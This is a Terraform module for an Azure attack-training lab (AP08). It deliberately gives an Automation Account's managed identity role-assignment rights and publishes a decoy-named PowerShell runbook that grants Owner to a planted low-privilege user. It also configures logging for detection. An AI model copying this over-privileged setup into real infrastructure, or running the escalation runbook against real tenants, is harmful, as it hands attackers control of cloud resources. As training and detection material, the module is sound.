# ==================================================================
# AP08 - Automation Account runbook -> escalada RBAC (Azure, coste ~0, SIN VM).
#
# MITRE: T1651 (Cloud Administration Command, PRIMARIO - ejecutar comandos via
# un runbook) + T1098.003 (Additional Cloud Roles - el role assignment que
# concede el rol privilegiado) + T1078.004 (Valid Accounts: Cloud Accounts -
# el atacante persiste como Owner). Temario CARTP/CARTE.
#
# MISCONFIG NUCLEO: un Automation Account con system-assigned Managed Identity
# que ostenta un rol con Microsoft.Authorization/roleAssignments/write (User
# Access Administrator u Owner) SOBRE EL RG de AP08. Un principal de BAJO
# privilegio con Automation Contributor sobre ese RG autora/importa un runbook y
# lanza un job -> el job corre COMO la MI (Connect-AzAccount -Identity) -> como
# la MI es over-priv, New-AzRoleAssignment se auto-concede Owner del RG ->
# escalada RBAC. El ACTOR efectivo es la MI del Automation Account (paridad con
# AP02, donde el actor es la MI robada via IMDS): el confused deputy es "quien
# puede correr un runbook es dueno del scope de la MI".
#
# Patron feature-flag: count = var.enable_ap08 ? 1 : 0. reset = apply con
# enable_ap08=false -> count=0 -> destruye TODO AP08 de forma atomica.
#
# RESET-SAFETY (constraint firme): el rol de la MI y la escalada de RUNTIME son
# RG-SCOPED (scope = el RG, NUNCA la subscription). enable_ap08=false destruye el
# RG -> y CON EL, toda role assignment de runtime scoped al RG (el self-grant de
# Owner que ejecuta el alumno). Cero residuo out-of-state (como AP05/AP07). Un
# -Scope de subscription sobreviviria al destroy -> residuo + blast radius: el lab
# lo acota al RG A PROPOSITO (analogo al bosque usar-y-tirar de AP05).
#
# DECLARATIVO SIN SEED (como AP02/AP03/AP04/AP07, sin seed imperativo, frente a
# AP01/AP05): deploy = solo terraform apply. CORRER el runbook (el "rompe") es
# accion del ALUMNO: Terraform PUBLICA el runbook (gun cargada) pero NUNCA lanza
# un job ni crea un schedule.
#
# CAVEAT toxic-state (como AP05/AP07): random_password del atacante aterriza en
# el tfstate (sensible); solo output sensible. .gitignore bloquea *.tfstate*.
#
# NOTA providers: el modulo YA crea azuread_* (SP de AP02) heredando azuread del
# providers.tf raiz, SIN required_providers propio. AP08 NO anade provider ni
# requiere crear versions.tf.
# ==================================================================

locals {
  # Short-circuit idiom de AP07 (no indexa [0] con el flag off).
  ap08_suffix  = var.enable_ap08 ? random_string.ap08[0].result : ""
  ap08_rg_name = "${var.lab_prefix}-ap08-rg"

  # Automation Account: 6-50 chars, empieza por letra, alfanumerico + guiones.
  ap08_aa_name = "${var.lab_prefix}-ap08-aa-${local.ap08_suffix}"

  # Valor de variable -> display name REAL del rol built-in. Ambos incluyen
  # roleAssignments/write. 'UserAccessAdministrator' -> 'User Access Administrator'.
  ap08_mi_role_name = var.mi_role == "Owner" ? "Owner" : "User Access Administrator"

  # Nombre SENUELO (fidelidad del decoy como AP01/AP07), FIJO para anclar la
  # deteccion. null si runbook_mode=none (sin runbook).
  ap08_runbook_name = var.enable_ap08 && var.runbook_mode != "none" ? "${var.lab_prefix}-ap08-maintenance" : null

  ap08_attacker_upn = "${var.lab_prefix}-ap08-attacker@${var.tenant_domain}"

  # Escalares GUARDADOS ("" con AP08 off): el content del runbook SOLO referencia
  # estos, NUNCA [0] directo -> evaluar el heredoc con el flag off da texto con
  # huecos vacios, nunca index-out-of-range.
  ap08_attacker_oid = var.enable_ap08 ? azuread_user.ap08_attacker[0].object_id : ""
  ap08_rg_id        = var.enable_ap08 ? azurerm_resource_group.ap08[0].id : ""

  # Telemetria (calca local.ap07_collect_logs).
  ap08_collect_logs = var.enable_ap08 && var.collect_automation_logs
  ap08_law_id = local.ap08_collect_logs ? (
    var.existing_log_analytics_workspace_id != null ? var.existing_log_analytics_workspace_id : azurerm_log_analytics_workspace.ap08[0].id
  ) : null
  ap08_law_name = local.ap08_collect_logs && var.existing_log_analytics_workspace_id == null ? azurerm_log_analytics_workspace.ap08[0].name : null

  # Content del runbook (heredoc determinista; solo ${local.*} se interpola;
  # $var y $(...) de PowerShell son literales para HCL -no son ${...}-).
  ap08_poc_content = <<-POC
    <#
      Caelum Range - AP08 runbook_mode="poc_escalation". Corre COMO la system-
      assigned MI del Automation Account. La MI ostenta ${local.ap08_mi_role_name}
      sobre el RG -> se auto-concede Owner del RG al atacante. SCOPE = el RG A
      PROPOSITO (reset-safe: la assignment muere con el RG; un -Scope de
      subscription SOBREVIVIRIA al destroy). La salida NO se suprime para que
      JobStreams sea testeable; un atacante sigiloso haria '| Out-Null' -> el
      data-plane es OPORTUNISTA, el control-plane (roleAssignments/write por la MI)
      es INSUPRIMIBLE. Terraform PUBLICA pero NUNCA ejecuta: el "rompe" lo lanzas TU.
    #>
    $ErrorActionPreference = 'Stop'
    Connect-AzAccount -Identity | Out-Null
    $ctx = Get-AzContext
    Write-Output "[AP08] Ejecutando como la MI del Automation Account: $($ctx.Account.Id)"
    $attackerObjectId = '${local.ap08_attacker_oid}'
    $scope            = '${local.ap08_rg_id}'
    Write-Output "[AP08] Concediendo 'Owner' sobre $scope al principal $attackerObjectId (New-AzRoleAssignment)..."
    New-AzRoleAssignment -ObjectId $attackerObjectId -RoleDefinitionName 'Owner' -Scope $scope
    Write-Output "[AP08] Escalada completada: el low-priv es ahora Owner del RG (T1651 -> T1098.003 -> T1078.004)."
  POC

  ap08_probe_content = <<-PROBE
    <#
      Caelum Range - AP08 runbook_mode="benign_probe". Prueba IDENTIDAD y PODER de
      la MI SIN escalar (reconocimiento del operador cuidadoso): confirma que el job
      corre COMO la MI y que la MI ostenta ${local.ap08_mi_role_name} sobre el RG.
      El alumno ESCRIBE el New-AzRoleAssignment.
    #>
    $ErrorActionPreference = 'Stop'
    Connect-AzAccount -Identity | Out-Null
    $ctx = Get-AzContext
    Write-Output "[AP08] Ejecutando como la MI del Automation Account: $($ctx.Account.Id)"
    $tok = Get-AzAccessToken -ResourceUrl 'https://management.azure.com/'
    Write-Output "[AP08] Token de gestion obtenido (expira $($tok.ExpiresOn)); valor NO impreso (higiene de secretos)."
    $scope = '${local.ap08_rg_id}'
    Write-Output "[AP08] Roles sobre $scope (localiza esta MI con User Access Administrator/Owner):"
    Get-AzRoleAssignment -Scope $scope | Format-Table DisplayName, RoleDefinitionName, Scope -AutoSize
    Write-Output "[AP08] Para escalar, escribe: New-AzRoleAssignment -ObjectId <tu oid> -RoleDefinitionName Owner -Scope $scope"
  PROBE

  ap08_runbook_content = var.runbook_mode == "poc_escalation" ? local.ap08_poc_content : local.ap08_probe_content
}

# Sufijo PROPIO (no reusar random_string de AP02/AP07, gateados en otros flags).
resource "random_string" "ap08" {
  count   = var.enable_ap08 ? 1 : 0
  length  = 5
  lower   = true
  numeric = true
  upper   = false
  special = false
}

# Resource group contenedor de TODA la ruta (blast radius acotado = reset-safe).
resource "azurerm_resource_group" "ap08" {
  count    = var.enable_ap08 ? 1 : 0
  name     = local.ap08_rg_name
  location = var.location

  tags = {
    range       = var.lab_prefix
    attack_path = "AP08"
  }
}

# Automation Account con system-assigned MI (el ACTOR efectivo, como la MI de
# AP02). sku "Basic": sin coste fijo; ~500 min/mes de runtime gratis. SIN VM.
# Los Run-As classic fueron retirados (sep-2023) -> system-assigned MI = primitivo
# fiel 2024+.
resource "azurerm_automation_account" "ap08" {
  count               = var.enable_ap08 ? 1 : 0
  name                = local.ap08_aa_name
  location            = azurerm_resource_group.ap08[0].location
  resource_group_name = azurerm_resource_group.ap08[0].name
  sku_name            = "Basic"

  identity {
    type = "SystemAssigned"
  }

  tags = {
    range       = var.lab_prefix
    attack_path = "AP08"
  }
}

# EXCESO DE PRIVILEGIO (nucleo): la MI recibe mi_role (UAA u Owner) SOBRE EL RG.
# Ambos incluyen roleAssignments/write -> la MI puede auto-concederse Owner (UAA
# puede conceder un rol superior a si mismo). RG-SCOPED. skip_service_principal_
# aad_check: la MI recien creada puede no haberse replicado en AAD (como AP02).
resource "azurerm_role_assignment" "ap08_mi" {
  count                            = var.enable_ap08 ? 1 : 0
  scope                            = azurerm_resource_group.ap08[0].id
  role_definition_name             = local.ap08_mi_role_name
  principal_id                     = azurerm_automation_account.ap08[0].identity[0].principal_id
  skip_service_principal_aad_check = true
}

# Atacante LOW-PRIV dedicado (Approach A). Su UNICO grant Azure es Automation
# Contributor sobre el RG -> NO tiene roleAssignments/write: debe conducir la MI.
# El password aterriza en el tfstate (sensible) -> solo output sensible.
resource "random_password" "ap08_attacker" {
  count   = var.enable_ap08 ? 1 : 0
  length  = 24
  special = true
}

resource "azuread_user" "ap08_attacker" {
  count                 = var.enable_ap08 ? 1 : 0
  user_principal_name   = local.ap08_attacker_upn
  display_name          = "Caelum AP08 Attacker (low-priv Automation Contributor)"
  mail_nickname         = "${var.lab_prefix}-ap08-attacker"
  password              = random_password.ap08_attacker[0].result
  force_password_change = false
}

# Automation Contributor del atacante SOBRE EL RG (RG-scoped). principal_type
# explicito evita que azurerm resuelva el tipo via Graph para un user recien
# creado (skip_service_principal_aad_check es para SP/MI, no cubre users).
resource "azurerm_role_assignment" "ap08_attacker_automation" {
  count                = var.enable_ap08 ? 1 : 0
  scope                = azurerm_resource_group.ap08[0].id
  role_definition_name = "Automation Contributor"
  principal_id         = azuread_user.ap08_attacker[0].object_id
  principal_type       = "User"
}

# Runbook INCRUSTADO (gun cargada), gateado por runbook_mode (none -> no se crea).
# content inline (azurerm ~3.116 lo importa y PUBLICA; sin publish_content_link;
# si un build lo exige, anadir un publish_content_link{uri} inerte). log_verbose=
# true -> el texto New-AzRoleAssignment viaja a JobStreams. Terraform PUBLICA pero
# NUNCA lanza un job ni crea schedule. CAVEAT entorno (como "la VM encendida" de
# AP05): asume Az.Accounts/Az.Resources en el Automation Account (las imagenes
# actuales los traen; si faltan, importar el modulo Az en Shared Resources).
resource "azurerm_automation_runbook" "ap08" {
  count                   = var.enable_ap08 && var.runbook_mode != "none" ? 1 : 0
  name                    = local.ap08_runbook_name
  location                = azurerm_resource_group.ap08[0].location
  resource_group_name     = azurerm_resource_group.ap08[0].name
  automation_account_name = azurerm_automation_account.ap08[0].name
  runbook_type            = "PowerShell"
  log_verbose             = true
  log_progress            = false
  description             = var.runbook_mode == "poc_escalation" ? "Mantenimiento nocturno (SENUELO AP08). En realidad: corre como la MI y se auto-concede Owner del RG. Disparalo TU; Terraform no lo ejecuta." : "Sonda de mantenimiento (benign_probe AP08): prueba identidad/poder de la MI sin escalar; escribe tu la escalada."
  content                 = local.ap08_runbook_content
}

# TELEMETRIA (gated enable_ap08 && collect_automation_logs). JobLogs + JobStreams.
# PROPIEDAD (como StorageBlobLogs de AP07 / AMA-DCR de AP05): NO activos por
# defecto -> sin este diagnostic setting la EJECUCION del runbook NO existe en
# ningun SIEM. El plano de gestion (jobs/write, roleAssignments/write) SI fluye por
# AzureActivity. DIFERENCIA vs AP07: Automation NO tiene tabla dedicada -> se OMITE
# log_analytics_destination_type -> AzureDiagnostics (ResourceProvider=MICROSOFT.
# AUTOMATION), donde el KQL busca.
resource "azurerm_log_analytics_workspace" "ap08" {
  count               = local.ap08_collect_logs && var.existing_log_analytics_workspace_id == null ? 1 : 0
  name                = "${var.lab_prefix}-ap08-law"
  location            = azurerm_resource_group.ap08[0].location
  resource_group_name = azurerm_resource_group.ap08[0].name
  sku                 = "PerGB2018"
  retention_in_days   = 31
}

resource "azurerm_monitor_diagnostic_setting" "ap08_automation" {
  count                      = local.ap08_collect_logs ? 1 : 0
  name                       = "${var.lab_prefix}-ap08-automation-diag"
  target_resource_id         = azurerm_automation_account.ap08[0].id
  log_analytics_workspace_id = local.ap08_law_id

  enabled_log {
    category = "JobLogs"
  }
  enabled_log {
    category = "JobStreams"
  }

  # metric{AllMetrics,false}: neutraliza el perpetual-diff (idiom AP07). Si tu
  # entorno rechaza 'AllMetrics' para Automation, elimina este bloque (el objetivo
  # son los LOGS) o anade lifecycle{ignore_changes=[metric]}.
  metric {
    category = "AllMetrics"
    enabled  = false
  }
}
